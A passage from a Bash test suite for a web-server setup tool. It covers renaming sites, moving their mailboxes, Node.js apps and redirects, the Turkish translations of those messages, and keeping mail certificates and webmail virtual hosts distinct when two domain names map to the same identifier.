assert_false "no mail domain is made under a name that is no domain name" test -e "$_rn/maildomains/shop_old"
assert_eq    "the block does not follow the site" "false" "$(_rn_json beta.example 'has("mail")')"
assert_true  "its archives do: nothing of a mail domain lies beside them" test -e "$_rn/backups/beta.example/shop_old-20260101-000000.tar.gz"
assert_true  "and the directory in the mail store is as it was" test -d "$_rn/vmail/shop_old/info/Maildir"

# with a Node.js application: a variable is a leftover when it names the home, not the word
_rn_odd_app() {   # the application's variables, as JSON
  _rn_odd_site staging
  jq '.mode = "proxy" | .php = {} | .proxy = {target: "127.0.0.1:3000", static_paths: "none"} | .app = {manager: "pm2", port: 3000, start: "npm start", enabled: true}' \
    "$_rn/state/domains/staging/domain.json" >"$_rn/t" && cp "$_rn/t" "$_rn/state/domains/staging/domain.json"
  printf '%s\n' "$1" >"$_rn/state/domains/staging/app-env.json"
  mkdir -p "$_rn/home/staging/app"
}
_rn_odd_app '{"NODE_ENV":"staging"}'
_rn_case _rn_rename staging beta.example
assert_has   "a site of that kind with an application is renamed" "rc=0" "$(_rn_out)"
assert_has   "its PM2 service is taken down for the user on its record" "app-teardown shop_example" "$(_rn_calls)"
assert_has   "and set up for the new one" "app-restore beta_example home=$_rn/home/beta.example" "$(_rn_calls)"
assert_lacks "a variable that only has the word in it is no leftover" "A variable of the application still names" "$(_rn_out)"
_rn_odd_app "{\"NODE_ENV\":\"staging\",\"UPLOADS\":\"$_rn/home/staging/app/uploads\"}"
_rn_case _rn_rename staging beta.example
assert_has   "one that names the home the site had is" "A variable of the application still names the old path $_rn/home/staging: setup.sh app env beta.example list" "$(_rn_out)"
_rn_odd_app "{\"HOME_DIR\":\"$_rn/home/staging\"}"
_rn_case _rn_rename staging beta.example
assert_has   "the home itself, with nothing after it, counts too" "A variable of the application still names the old path $_rn/home/staging" "$(_rn_out)"
unset -f _rn_odd_site _rn_odd_wp _rn_said _rn_odd_app _rn_rename_mail

# ---- in Turkish -------------------------------------------------------------------------
# What rename prints goes through lib/lang.sh like every other message: on a server set to
# Turkish the explanation before "Continue?", the steps and the summary are Turkish.
_rn_mail_boxes
_rn_case _rn_rename_tr alpha.example beta.example
_o="$(_rn_out)"
assert_has   "the Turkish rename succeeds like the English one" "rc=0" "$_o"
assert_has   "the headline" "alpha.example sitesi beta.example olarak yeniden adlandırılacak" "$_o"
assert_has   "what happens to the files and the user" "dosyalar $_rn/home/alpha.example, $_rn/home/beta.example olur (taşınır, kopyalanmaz); Linux kullanıcısı alpha_example, beta_example olur" "$_o"
assert_has   "to the database" "veritabanı alpha_db adını, kullanıcısını ve şifresini korur" "$_o"
assert_has   "to the old name" "alpha.example  yönlendirme olarak kalır: her istek 301 ile beta.example adresine gider, mevcut sertifikasıyla" "$_o"
assert_has   "to the mail" "posta    her posta kutusu postaları ve şifresiyle @beta.example alanına taşınır; @alpha.example alanındaki her adres onun takma adı olur" "$_o"
assert_has   "the safety backup" "önce $_rn/backups/alpha.example/ altına bir güvenlik yedeği yazılır; site yaklaşık bir dakika kapalı kalır" "$_o"
assert_has   "a step" "alpha.example için güvenlik yedeği" "$_o"
assert_has   "another" "Site beta.example adına taşınıyor" "$_o"
assert_has   "the step of the mailboxes" "Posta kutuları @beta.example alanına" "$_o"
assert_has   "the closing line" "alpha.example, beta.example olarak yeniden adlandırıldı" "$_o"
assert_has   "the summary's labels" "Eski ad" "$_o"
assert_has   "where the mail is now" "Posta: artık @beta.example alanında - info@beta.example, sales@beta.example. Şifreler aynı; giriş için kullanıcı adı yeni adrestir." "$_o"
assert_has   "the DNS the redirect needs" "Yönlendirmenin çalışmasını istediğiniz sürece alpha.example alan adının DNS kaydı buraya yönlenmeli." "$_o"
_rn_left=""
for _rn_en in ' becomes ' 'stays as a redirect' 'safety backup' 'Renamed ' 'Moving the site' 'The old name' 'Certificate for' 'Mailboxes to' \
              'Keep the DNS' 'Mail: now' 'now sends every request' 'Taking ' 'virtual host' 'Old name' 'Backups' 'This will rename' 'every mailbox' 'For mail from outside'; do
  if [[ "$_o" == *"$_rn_en"* ]]; then _rn_left+="[${_rn_en}] "; fi
done
assert_eq    "nothing of it is left in English" "" "$_rn_left"
_rn_app_site
_rn_case _rn_rename_tr alpha.example beta.example
assert_has   "a Node.js site: what happens to the application" "Node.js  PM2 servisi yeni kullanıcı altında yeniden ayarlanır: bağımlılıklar yeniden kurulur, uygulama derlenir ve başlatılır" "$(_rn_out)"
assert_has   "and its step" "Node.js uygulaması" "$(_rn_out)"
assert_has   "the variable that still names the old domain" "Uygulamanın bir değişkeni hâlâ alpha.example adını içeriyor: setup.sh app env beta.example list" "$(_rn_out)"
_rn_fresh
_rn_site gamma.example gamma_example
_rn_case _rn_rename_tr alpha.example gamma.example
assert_has   "a refusal is Turkish" "alpha.example, gamma.example olarak yeniden adlandırılamıyor" "$(_rn_out)"
assert_has   "with its reason" "gamma.example zaten bu sunucunun bir sitesi" "$(_rn_out)"
_rn_case _rn_rename_tr alpha.example beta.example --keep-mail
: >"$_rn/mail-installed"
_rn_mail_site
_rn_case _rn_rename_tr alpha.example beta.example --keep-mail
assert_has   "--keep-mail: the mail that stays" "posta    @alpha.example alanında kalır: her posta kutusu, takma ad ve anahtar olduğu gibi; alpha.example kendi başına bir posta alan adı olur" "$(_rn_out)"
_rn_fresh
_rn_case _rn_redirect_tr add old.example alpha.example --www --no-ssl
assert_has   "redirect add in Turkish" "old.example ve www.old.example artık https://alpha.example adresine gidiyor (yalnızca HTTP)" "$(_rn_out)"
_rn_case _rn_redirect_tr del nosuch.example
assert_has   "and a redirect that is not there" "nosuch.example adında bir yönlendirme yok" "$(_rn_out)"
# the rarer lines: a refusal about somebody else's account, a WordPress nothing could be asked
# of, a mailbox that could not move
_rn_case _rn_say_tr "it is on record as running as b_c_example, and that account's home is /home/b-c.example: another site's (setup.sh remove b.c.example puts such a record away)"
assert_eq    "the account that is another site's" "kayıtta b_c_example olarak çalıştığı yazıyor, o hesabın ev dizini ise /home/b-c.example: başka bir sitenin (setup.sh remove b.c.example böyle bir kaydı kaldırır)rc=0" "$(_rn_out)"
_rn_case _rn_say_tr "wp-cli could not be installed, so the WordPress database was not looked at: it may give another name than beta.example as its address"
assert_has   "wp-cli missing for a name that was no address" "wp-cli kurulamadı, bu yüzden WordPress veritabanına bakılmadı: adres olarak beta.example dışında bir ad veriyor olabilir" "$(_rn_out)"
_rn_case _rn_say_tr "Later: wp option get home - and if that is another name: wp search-replace '//that-name' '//beta.example' --all-tables-with-prefix --skip-columns=guid   (as beta_example, in /home/beta.example/public_html)"
assert_has   "its command for later: the longer form is the one taken" "Sonra: wp option get home - başka bir ad çıkarsa: wp search-replace '//o-ad' '//beta.example'" "$(_rn_out)"
_rn_case _rn_say_tr "Later: wp search-replace '//alpha.example' '//beta.example' --all-tables-with-prefix --skip-columns=guid   (as beta_example, in /home/beta.example/public_html)"
assert_has   "and the plain form still is itself" "Sonra: wp search-replace '//alpha.example' '//beta.example' --all-tables-with-prefix --skip-columns=guid   (beta_example olarak, /home/beta.example/public_html içinde)" "$(_rn_out)"
_rn_case _rn_say_tr "WordPress did not say which address it has, so no address in its database was rewritten: shop_old itself never was one"
assert_has   "a WordPress that did not say its address" "WordPress hangi adresi kullandığını söylemedi" "$(_rn_out)"
_rn_case _rn_say_tr "info@alpha.example stays a mailbox at alpha.example: no password line for info@alpha.example"
assert_eq    "a mailbox that stays, with a reason of the rarer kind" "info@alpha.example, alpha.example alanında posta kutusu olarak kalıyor: info@alpha.example için şifre satırı yokrc=0" "$(_rn_out)"
_rn_case _rn_say_tr "sales@alpha.example stays a mailbox at alpha.example: could not move /var/vmail/alpha.example/sales"
assert_has   "or of this one" "posta kutusu olarak kalıyor: /var/vmail/alpha.example/sales taşınamadı" "$(_rn_out)"
# the usage texts have their Turkish in the functions themselves
_rn_case _rn_usage_tr
_o="$(_rn_out)"
assert_has   "rename --help in Turkish" "Kullanım: setup.sh rename <eski-alan-adı> <yeni-alan-adı> [seçenekler]" "$_o"
assert_has   "with every option" "--keep-mail          Posta kutularını taşımak yerine eski alan adında bırak" "$_o"
for _rn_opt in --no-redirect --no-ssl --no-search-replace --keep-mail; do
  assert_eq  "the Turkish usage names ${_rn_opt} once, as the English one does" "1 1" \
    "$(grep -c -- "^  ${_rn_opt} " <<<"$_o") $(lib_domain_rename_usage | grep -c -- "^  ${_rn_opt} ")"
done
assert_has   "redirect help in Turkish" "Kullanım: setup.sh redirect <komut>" "$_o"
assert_has   "with its three commands" "del <kimden> [--keep-ssl]" "$_o"
assert_lacks "and no English usage beside it" "Usage: setup.sh" "$_o"
_rn_case _rn_usage_en
assert_has   "without a language the usage is the English one" "Usage: setup.sh rename <old-domain> <new-domain> [options]" "$(_rn_out)"
assert_lacks "and only that" "Kullanım" "$(_rn_out)"
_rn_fresh
_rn_case _rn_redirect_tr list
assert_has   "an empty redirect list says so in Turkish" "(yönlendirme yok - eklemek için: setup.sh redirect add old-name.com example.com)" "$(_rn_out)"
_rn_case _rn_redirect list
assert_has   "and in English as before" "(no redirects - add one with: setup.sh redirect add old-name.com example.com)" "$(_rn_out)"
# the tables: headings and the words in the cells, columns in line
_rn_fresh
_rn_case lib_redirect_save old.example alpha.example 1
_rn_case _rn_list_tr
_o="$(_rn_out)"
assert_has   "list: the headings" "ALAN ADI                     MOD        PHP   SSL                      SON YEDEK              DURUM" "$_o"
assert_has   "a row keeps its columns under them" "alpha.example                php        8.3   60 days" "$_o"
assert_has   "the word in a cell is Turkish" " etkin" "$(grep '^alpha.example' <<<"$_o")"
assert_has   "the line under the table" "1 site; dosyalar $_rn/home/<domain>/public_html altında" "$_o"
assert_has   "a redirect's row is still there" "-> alpha.example" "$_o"
_rn_case lib_domain_list_main
assert_has   "in English the table is what it was" "DOMAIN                       MODE       PHP   SSL                      LAST BACKUP            STATUS" "$(_rn_out)"
assert_has   "row and all" " active" "$(_rn_out | grep '^alpha.example')"
_rn_case _rn_harden_tr
_o="$(_rn_out)"
assert_has   "harden status: the firewall line" "Site güvenlik duvarı: açık ama YÜKLÜ DEĞİL" "$_o"
assert_has   "its headings" "SİTE                               MOD        SÜREÇ ÇALIŞTIRMA       YÜKLEME DİZİNLERİNDE BETİK" "$_o"
assert_has   "a cell: blocked, and one nobody decided" "php        engelli                karar yok" "$_o"
_rn_case _rn_rlist_tr
assert_has   "redirect list: the headings" "KAYNAK                         HEDEF                              SSL" "$(_rn_out)"
# an English run says what it always said: the scripts and the tests above read that
_rn_fresh
_rn_case _rn_rename alpha.example beta.example
assert_has   "without a language the output is English as before" "Renamed alpha.example to beta.example" "$(_rn_out)"
assert_has   "headline included" "This will rename the site alpha.example to beta.example" "$(_rn_out)"
assert_true  "the menu's explanation of the rename has its Turkish" test -n "${MENU_TR['Its mailboxes move to the new domain too, and the old addresses keep working. A Node.js application is built again.']:-}"
assert_has   "and is part of the entry" 'Its mailboxes move to the new domain too' "$(declare -f _menu_rename_site)"

# ---- the helpers ------------------------------------------------------------------------
_rn_fresh
_rn_case _domain_rename_wp_pairs a.example b.example 1
assert_eq "the pairs, with www" "//www.a.example>//www.b.example|//a.example>//b.example|\\/\\/www.a.example>\\/\\/www.b.example|\\/\\/a.example>\\/\\/b.example|$_rn/home/a.example/>$_rn/home/b.example/|rc=0" "$(_rn_out | tr '\t\n' '>|' | sed 's/|$//')"
_rn_case _domain_rename_wp_pairs a.example b.example 0
assert_has "without www every form ends at the bare name" "//www.a.example>//b.example|" "$(_rn_out | tr '\t\n' '>|')"

# usermod and userdel refuse a user something still runs as
: >"$_rn/calls"
_rn_case _rn_quiet alpha_example
assert_eq  "nothing runs as the user: asked once to stop, and done" "pkill -u alpha_example|rc=0" "$(_rn_calls | tr '\n' '|')$(_rn_out)"
: >"$_rn/calls"; printf 3 >"$_rn/running"
_rn_case _rn_quiet alpha_example
assert_eq  "processes that take a moment to end are waited for" "rc=0" "$(_rn_out)"
assert_lacks "and not killed" "KILL" "$(_rn_calls)"
: >"$_rn/calls"; printf 999 >"$_rn/running"
_rn_case _rn_quiet alpha_example
assert_has "ones that do not end are killed" "pkill -KILL -u alpha_example" "$(_rn_calls)"
assert_has "and if even that does not help, it says so" "rc=1" "$(_rn_out)"
: >"$_rn/calls"; rm -f "$_rn/running"
_rn_case _rn_quiet nosuch_user
assert_eq  "a user that is not there is nobody to stop" "rc=0" "$(_rn_calls)$(_rn_out)"
assert_has "remove waits the same way before userdel" '_domain_rename_quiet_user "$D_USER" || true' "$(sed -n '/^lib_domain_remove_main() {/,/^}/p' "$ROOT/lib/domain.sh")"

# ---- the command line and the menu ------------------------------------------------------
_rn_setup="$(cat "$ROOT/setup.sh")"
assert_has  "setup.sh loads the module" " rename menu; do" "$_rn_setup"
assert_has  "and knows the command" 'rename)         lib_domain_rename_main "${rest[@]}" ;;' "$_rn_setup"
assert_has  "and redirect" 'redirect)       lib_redirect_main "${rest[@]}" ;;' "$_rn_setup"
assert_has  "listing the redirects takes no lock; changing them does" 'redirect) case "${rest[0]:-list}" in list|--list|help|-h|--help) ;; *) lib_lock ;; esac ;;' "$_rn_setup"
assert_lacks "rename is not among the commands that run without the lock" "rename" "$(grep -n 'list|status|doctor|credentials|logs|menu|scan) ;;' "$ROOT/setup.sh")"
_rn_usage="$(lib_usage)"
assert_has  "help has rename" "rename <old> <new>" "$_rn_usage"
assert_has  "and redirect" "redirect add <from> <to>" "$_rn_usage"
_rn_menu="$(declare -f lib_menu_main)"
assert_has  "the menu offers the rename" "Rename a site" "$_rn_menu"
assert_has  "and runs it" "26) _menu_rename_site" "$(tr -s ' \n' ' ' <<<"$_rn_menu")"
assert_has  "and the redirects" "27) _menu_redirects" "$(tr -s ' \n' ' ' <<<"$_rn_menu")"
_rn_menu_fn="$(declare -f _menu_rename_site)"
assert_has  "from the menu the old name stays a redirect unless that is declined" '--no-redirect' "$_rn_menu_fn"
assert_has  "and the name typed is checked before the command runs" 'lib_domain_valid' "$_rn_menu_fn"
# the menu entry itself: what it asks, and the command it runs
_mrn() {   # the site picked, the name typed, [the answer about the redirect]
  (
    eval '_menu_ask() { local -n _o="$1"; printf "asked: %s\n" "$2"; if [[ "$1" == "new" ]]; then _o="$_mrn_new"; else _o="${_mrn_keep:-${3:-}}"; fi; }
          _menu_run() { printf "runs: %s\n" "$*"; }
          _menu_pick_domain() { printf "%s" "$_mrn_site"; }
          _menu_pause() { :; }'
    _mrn_site="$1"; _mrn_new="$2"; _mrn_keep="${3:-}"; MENU_LANG="en"
    _menu_rename_site 2>&1
  )
}
assert_has   "the menu renames the site that was picked, to the name typed" "runs: rename alpha.example beta.example" "$(_mrn alpha.example Beta.Example)"
assert_has   "after asking whether the old name stays as a redirect" "asked: Keep alpha.example as a redirect (301) to beta.example" "$(_mrn alpha.example beta.example)"
assert_has   "which a no drops" "runs: rename alpha.example beta.example --no-redirect" "$(_mrn alpha.example beta.example n)"
assert_lacks "a site whose name is no domain name is not asked: nothing could ask for that name" "asked: Keep" "$(_mrn shop_old beta.example)"
assert_eq    "it is renamed without the question" "runs: rename shop_old beta.example" "$(_mrn shop_old beta.example n | tail -n 1)"
assert_lacks "a new name that is none goes no further than the menu" "runs:" "$(_mrn shop_old shop_new)"
unset -f _mrn
unset -f _rn_case _rn_out _rn_calls _rn_site _rn_fresh _rn_tree _rn_json _rn_mail_site _rn_app_site _rn_mail_boxes _rn_alias

# =============================================================================
section "two domains never share the name their certificate and webmail go by"
# The certbot lineage of mail.<domain> and the webmail's virtual host are named after the
# site identifier, and that one turns every separator into "_" and stops at 28 characters:
# a-b.example and a.b.example come out the same, and so does a long name under .com and under
# .com.tr. Two sites cannot share one - they would share a Linux user - but nothing stopped a
# mail domain. certbot, given the name of a lineage that exists and other names, re-issues it
# for the new ones; the second webmail was written into the first one's virtual host; and
# switching off or removing either of the two took both away.
#
# certbot is stood in for by something that does what certbot does: a certificate for exactly
# the names asked for, under the lineage named, in place of whatever was there.
_id="$TMP/ident"; rm -rf "$_id"; mkdir -p "$_id"
_id_saved_fn="$(declare -f lib_domains_list)"
eval "$(sed -n '/^lib_domains_list() {/,/^}/p' "$ROOT/lib/common.sh")"
_id_vars="STATE_DIR CRON_FILE MAIL_STATE_DIR MAIL_ALIAS_DIR MAIL_DISABLED_DIR MAIL_DOMAINS_DIR MAIL_DOMAINS_GONE_DIR MAIL_VMAIL_HOME MAIL_PASSWD_FILE MAIL_DKIM_DIR MAIL_DOVECOT_DIR MAIL_PW_HELPER MAIL_PW_SUDOERS BACKUP_ROOT BACKUP_KEY_FILE WM_ROOT WM_RELEASES WM_CURRENT WM_ETC WM_CONF WM_VAR WM_LOG_DIR WM_INFO WM_IDENT_MAP LE_LIVE SSL_DEPLOY_DIR LSWS_VHOSTS_DIR"
# shellcheck disable=SC2086
_id_saved_vars="$(declare -p $_id_vars INS_ROLE OPT_DRY_RUN)"
STATE_DIR="$_id/root/.server-setup"; CRON_FILE="$_id/etc/cron.d/lomp"
MAIL_STATE_DIR="$STATE_DIR/mail"; MAIL_ALIAS_DIR="$MAIL_STATE_DIR/aliases"; MAIL_DISABLED_DIR="$MAIL_STATE_DIR/disabled"
MAIL_DOMAINS_DIR="$MAIL_STATE_DIR/domains"; MAIL_DOMAINS_GONE_DIR="$STATE_DIR/archive/mail-domains"
MAIL_VMAIL_HOME="$_id/var/vmail"; MAIL_DKIM_DIR="$_id/var/dkim"
MAIL_DOVECOT_DIR="$_id/etc/dovecot"; MAIL_PASSWD_FILE="$MAIL_DOVECOT_DIR/passwd"
MAIL_PW_HELPER="$_id/etc/webmail-passwd"; MAIL_PW_SUDOERS="$_id/etc/sudoers-webmail"
BACKUP_ROOT="$_id/var/backups"; BACKUP_KEY_FILE="$STATE_DIR/backup.key"
WM_ROOT="$_id/var/webmail"; WM_RELEASES="$WM_ROOT/releases"; WM_CURRENT="$WM_ROOT/current"
WM_ETC="$_id/etc/webmail"; WM_CONF="$WM_ETC/config.inc.php"; WM_IDENT_MAP="$WM_ETC/identities.map"
WM_VAR="$_id/var/webmail-var"; WM_LOG_DIR="$_id/var/webmail-log"; WM_INFO="$STATE_DIR/webmail.info"
LE_LIVE="$_id/etc/live"; SSL_DEPLOY_DIR="$_id/var/ssl"; LSWS_VHOSTS_DIR="$_id/var/vhosts"; INS_ROLE=""; OPT_DRY_RUN=0
_id_ok=1
for _v in $_id_vars LOG_FILE SITES_ROOT SITES_LOG_ROOT TMPDIR; do
  if [[ "${!_v}" != "$TMP" && "${!_v}" != "$TMP"/* ]]; then _id_ok=0; fail "this section would work outside its directory: ${_v}=${!_v}"; fi
done
assert_eq "everything these commands can touch is inside the test directory" 1 "$_id_ok"

# a certificate for exactly these names, under this lineage, in place of what was there
_id_issue() {   # lineage name...
  local cert="$1" san="" n=""
  shift
  for n in "$@"; do san+="${san:+,}DNS:${n}"; done
  mkdir -p "$SSL_DEPLOY_DIR/$cert"
  MSYS2_ARG_CONV_EXCL='/CN=' openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 -nodes -days 30 \
    -keyout "$SSL_DEPLOY_DIR/$cert/privkey.pem" -out "$SSL_DEPLOY_DIR/$cert/fullchain.pem" \
    -subj "/CN=${1}" -addext "subjectAltName=${san}" >/dev/null 2>&1
}
# What reaches outside this process is stood in for; what decides, records and removes is real.
_id_stubs='lib_mail_installed() { return 0; }
  lib_require_tools() { return 0; }
  lib_mail_tables_apply() { return 0; }
  lib_mail_dkim_ensure() { return 0; }
  lib_mail_dns_print() { return 0; }
  _mail_webmail_forget() { return 0; }
  lib_cf_token() { printf ""; }
  lib_ssl_deploy_files() { return 0; }
  lib_ssl_obtain_names() {
    local c="$1"; shift
    if (( OPT_DRY_RUN )); then printf "would request %s for %s\n" "$c" "$*"; return 0; fi
    printf "%s %s\n" "$c" "$*" >>"$_id/certbot.log"
    if [[ -e "$_id/certbot.refuses" ]]; then SSL_LAST_ERROR="the name does not point here yet"; return 1; fi
    _id_issue "$c" "$@"
  }
  certbot() { return 1; }
  lib_webmail_installed() { return 0; }
  _wm_mail_stack_current() { return 0; }
  lib_webmail_dirs_ensure() { return 0; }
  lib_mail_pw_helper_apply() { return 0; }
  lib_webmail_config_apply() { return 0; }
  lib_webmail_identities_apply() { return 0; }
  lib_webmail_fail2ban_apply() { return 0; }
  lib_webmail_render_extprocessor() { printf "x\n"; }
  lib_ols_is_installed() { return 0; }
  lib_ols_change_begin() { return 0; }
  lib_ols_change_commit() { return 0; }
  lib_ols_tx_begin() { return 0; }
  lib_ols_tx_commit() { return 0; }
  lib_ols_tx_block_put() { cat >/dev/null; }
  lib_ols_tx_block_exists() { return 1; }
  lib_ols_tx_block_remove() { return 0; }
  _id_maps_drop() { [[ -s "$_id/maps" ]] || return 0; awk -v l="$1" -v n="$2" "!(\$1 == l && \$2 == n)" "$_id/maps" >"$_id/maps.new" || true; mv -f "$_id/maps.new" "$_id/maps"; }
  lib_ols_tx_map_set() { _id_maps_drop "$1" "$2"; printf "%s %s %s\n" "$1" "$2" "$3" >>"$_id/maps"; }
  lib_ols_tx_map_del() { _id_maps_drop "$1" "$2"; }
  systemctl() { return 1; }
  pkill() { return 0; }
  doveadm() { return 1; }
  postqueue() { return 1; }
  sleep() { return 0; }
  lib_have() { case "$1" in jq|awk|sed|grep|openssl|tar|realpath|sha256sum|cksum) command -v "$1" >/dev/null 2>&1 ;; *) return 1 ;; esac; }
  rm() {
    local a="" real=""
    for a in "$@"; do
      case "$a" in -*) continue ;; esac
      real="$(realpath -m -- "$a" 2>/dev/null || true)"
      if [[ -z "$real" || ( "$real" != "$TMP" && "$real" != "$TMP"/* ) ]]; then printf "%s\n" "$a" >>"$_id/rm-refused.log"; return 0; fi
    done
    command rm "$@"
  }'
# under run_isolated the status is the answer; what the command said is kept for the next line
_id_do()   { eval "$_id_stubs"; OPT_YES=1; OPT_QUIET=0; "$@" >"$_id/said.txt" 2>&1 </dev/null; }
_id_run()  { ( _id_do "$@" ) || true; }
_id_said() { cat "$_id/said.txt" 2>/dev/null || true; }
_id_asked() { LC_ALL=C sort "$_id/certbot.log" 2>/dev/null | tr '\n' '|' || true; }
_id_rec()  { jq -r '.mail.ident // ""' "$(lib_mail_json "$1")" 2>/dev/null || true; }   # what is on record, if anything
_id_is_name() { [[ "$1" =~ ^[a-z][a-z0-9_]{1,27}$ ]]; }
_id_hash() { printf '%s' "$1" | sha256sum | cut -c1-6; }
# an empty server
_id_fresh() {
  rm -rf "$_id/root" "$_id/var" "$_id/etc" "$_id/certbot.log" "$_id/certbot.refuses" "$_id/maps"
  mkdir -p "$STATE_DIR/domains" "$MAIL_DOMAINS_DIR" "$MAIL_ALIAS_DIR" "$MAIL_DKIM_DIR" "$MAIL_VMAIL_HOME" "$MAIL_DOVECOT_DIR" \
           "$BACKUP_ROOT" "$SSL_DEPLOY_DIR" "$LE_LIVE" "$LSWS_VHOSTS_DIR"
  printf '{"installed_at":"2026-01-01T00:00:00Z","components":{"mail":{"postfix":"3.8"}},"mail":{"hostname":"mail.host.example"},"params":{}}\n' >"$STATE_DIR/manifest.json"
  : >"$MAIL_PASSWD_FILE"
}
# a mail domain's record the way a release before this one wrote it: nothing in it about a name
_id_old_mail() {   # domain [true = with a webmail]
  mkdir -p "$MAIL_DOMAINS_DIR/$1"
  jq -n --arg d "$1" --argjson w "${2:-false}" \
    '{domain:$d, kind:"mail", mail:({enabled:true, selector:"lomp202601"} + (if $w then {webmail:true, webmail_host:("webmail." + $d)} else {} end))}' \
    >"$(lib_mail_domain_file "$1")"
}
_id_old_site() {   # domain   (a site that never had mail)
  mkdir -p "$STATE_DIR/domains/$1"
  printf '{"domain":"%s","mode":"php","user":"%s"}\n' "$1" "$(lib_domain_ident "$1")" >"$(lib_domain_json "$1")"
}
_id_vhost() {   # the domain whose name it lies under, the host it answers for
  local v=""; v="$(lib_webmail_vhost_name "$1")"
  mkdir -p "$LSWS_VHOSTS_DIR/$v"
  printf 'docRoot                   $VH_ROOT/current/public_html/\nvhDomain                  %s\n' "$2" >"$LSWS_VHOSTS_DIR/$v/vhconf.conf"
  printf 'HTTP %s %s\nHTTPS %s %s\n' "$v" "$2" "$v" "$2" >>"$_id/maps"
}
# everything that is one domain's - its certificate, its virtual host, its lines in the listener
# maps - and, apart from that, its record: a write into another domain's record is to show as
# that, not as damage
_id_things() {
  local c="" v=""
  c="$(lib_mail_cert_name "$1")"; v="$(lib_webmail_vhost_name "$1")"
  { cksum "$SSL_DEPLOY_DIR/$c/fullchain.pem" "$SSL_DEPLOY_DIR/$c/privkey.pem" "$LSWS_VHOSTS_DIR/$v/vhconf.conf" 2>&1 || true
    grep " ${v} " "$_id/maps" 2>/dev/null || true; } | LC_ALL=C sort | cksum
}
_id_record() { cksum <"$(lib_mail_json "$1")"; }
_id_doc() { DOC_RESULTS=(); DOC_FAIL=0; DOC_WARN=0; DOC_OK=0; "${1:-_doc_mail_shared_names}"; printf '%s\n' "${DOC_RESULTS[@]-}"; }

if (( _id_ok )) && lib_have openssl; then
  # ---- a domain on its own goes by what it always went by ---------------------
  _id_fresh
  _id_run lib_mail_domain_add_main solo.example
  assert_true  "a mail domain is added"                                     lib_mail_domain_enabled solo.example
  assert_eq    "its certificate goes by the identifier, as it always did"   "_mail_solo_example" "$(lib_mail_cert_name solo.example)"
  assert_eq    "and so does its webmail's virtual host"                     "_wm_solo_example" "$(lib_webmail_vhost_name solo.example)"
  assert_eq    "nothing is put on record for it"                            "" "$(_id_rec solo.example)"
  assert_eq    "its certificate was asked for under that name"              "_mail_solo_example mail.solo.example|" "$(_id_asked)"

  # ---- the second of two that would share one ---------------------------------
  _id_fresh
  _id_run lib_mail_domain_add_main a-b.example
  _id_r1="$(_id_record a-b.example)"
  _id_run lib_mail_domain_add_main a.b.example
  _id_n2="$(_id_rec a.b.example)"
  assert_eq    "a-b.example and a.b.example have one identifier between them" "$(lib_domain_ident a-b.example)" "$(lib_domain_ident a.b.example)"
  assert_eq    "the one that was here first keeps it"                       "_mail_a_b_example" "$(lib_mail_cert_name a-b.example)"
  assert_eq    "and has nothing on record"                                  "" "$(_id_rec a-b.example)"
  assert_eq    "its record is not written to when the second arrives"       "$_id_r1" "$(_id_record a-b.example)"
  assert_true  "the second has a name of its own on record"                 test -n "$_id_n2"
  assert_true  "not the first one's"                                        test "$_id_n2" != "a_b_example"
  assert_true  "a name: a letter, then letters, digits, underscores, 28 at most" _id_is_name "$_id_n2"
  assert_eq    "the identifier and a few digits of a hash of the domain"    "a_b_example_$(_id_hash a.b.example)" "$_id_n2"
  assert_eq    "its certificate goes by it"                                 "_mail_${_id_n2}" "$(lib_mail_cert_name a.b.example)"
  assert_eq    "and so does its webmail"                                    "_wm_${_id_n2}" "$(lib_webmail_vhost_name a.b.example)"
  assert_eq    "certbot was asked for each under its own name, once"        "_mail_a_b_example mail.a-b.example|_mail_${_id_n2} mail.a.b.example|" "$(_id_asked)"
  assert_true  "the first one's certificate names the first one's host"     lib_ssl_cert_covers _mail_a_b_example mail.a-b.example
  assert_false "and not the second one's"                                   lib_ssl_cert_covers _mail_a_b_example mail.a.b.example
  assert_true  "the second one's names its own"                             lib_ssl_cert_covers "_mail_${_id_n2}" mail.a.b.example
  : >"$_id/certbot.log"
  for _d in a-b.example a.b.example a-b.example a.b.example; do _id_run lib_mail_main cert "$_d"; done
  assert_eq    "asked for a certificate again, in turn: nothing is requested" "" "$(_id_asked)"
  assert_eq    "and the second one's name is what it was"                   "$_id_n2" "$(_id_rec a.b.example)"

  # ---- a webmail each ---------------------------------------------------------
  for _d in a-b.example a.b.example; do
    lib_json_set "$(lib_mail_json "$_d")" '.mail.webmail = true | .mail.webmail_host = $h' --arg h "webmail.${_d}"
    _id_run lib_webmail_vhost_apply "$_d"
  done
  assert_eq    "the first one's virtual host answers for the first one's host" "webmail.a-b.example" "$(_wm_vhost_host a-b.example)"
  assert_eq    "the second one's for the second one's"                      "webmail.a.b.example" "$(_wm_vhost_host a.b.example)"
  assert_eq    "two virtual hosts, not one"                                 2 "$(find "$LSWS_VHOSTS_DIR" -mindepth 1 -maxdepth 1 -type d | wc -l | tr -d ' ')"
  assert_eq    "and both listeners send each host to its own" \
    "HTTP _wm_a_b_example webmail.a-b.example|HTTP _wm_${_id_n2} webmail.a.b.example|HTTPS _wm_a_b_example webmail.a-b.example|HTTPS _wm_${_id_n2} webmail.a.b.example|" \
    "$(LC_ALL=C sort "$_id/maps" | tr '\n' '|')"

  # ---- what is done to the second leaves the first as it was -------------------
  _id_t1="$(_id_things a-b.example)"; _id_r1="$(_id_record a-b.example)"
  assert_eq    "the second one's webmail is switched off"                   0 "$(run_isolated _id_do lib_mail_main webmail off a.b.example)"
  assert_false "its virtual host is gone"                                   test -e "$LSWS_VHOSTS_DIR/_wm_${_id_n2}"
  assert_eq    "the first one's certificate, virtual host and maps are as they were" "$_id_t1" "$(_id_things a-b.example)"
  assert_eq    "the second one's mail is deleted"                           0 "$(run_isolated _id_do lib_mail_main disable a.b.example --delete-data)"
  assert_false "its certificate is gone"                                    test -e "$SSL_DEPLOY_DIR/_mail_${_id_n2}"
  assert_eq    "the first one's are as they were"                           "$_id_t1" "$(_id_things a-b.example)"
  assert_eq    "it keeps its name while its mail is off"                    "$_id_n2" "$(_id_rec a.b.example)"
  : >"$_id/certbot.log"
  _id_run lib_mail_main enable a.b.example
  assert_eq    "and when it is switched on again"                           "$_id_n2" "$(_id_rec a.b.example)"
  assert_eq    "its certificate is asked for under it"                      "_mail_${_id_n2} mail.a.b.example|" "$(_id_asked)"
  assert_eq    "the second is removed"                                      0 "$(run_isolated _id_do lib_mail_main domain del a.b.example --no-backup)"
  assert_false "with its certificate"                                       test -e "$SSL_DEPLOY_DIR/_mail_${_id_n2}"
